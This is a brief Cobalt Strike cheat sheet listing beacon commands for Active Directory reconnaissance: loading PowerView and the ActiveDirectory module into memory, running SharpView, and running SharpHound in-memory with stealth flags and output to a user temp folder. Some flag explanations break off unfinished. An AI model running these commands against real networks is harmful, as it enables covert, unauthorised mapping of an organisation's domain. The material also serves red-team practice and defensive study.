# Cobalt Strike Cheat Sheet

## Running PowerShell scripts
```
powershell-import --> Select PowerView.ps1 to import PS1 file in memory
powershell Get-Module PowerView
powershell Get-NetUser -Identity testuser
```

## Running ActiveDirectory module
```
powershell import --> Select \ActiveDirectory\ActiveDirectory.psd1 file from https://github.com/samratashok/ADModule
```

## Executing .NET binaries (i.e. SharpView and SharpHound)
```
# Running SharpView in memory (.NET version of PowerView)
execute-assembly C:\SharpView.exe ...

# BloodHound collection with SharpHound.exe
# --Stealth will
# --excludedomaincontrollers will 
# --windowsonly will 
execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain test.lab.local --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\
```


# References
Cobalt Strike commands cheat-sheet: https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet
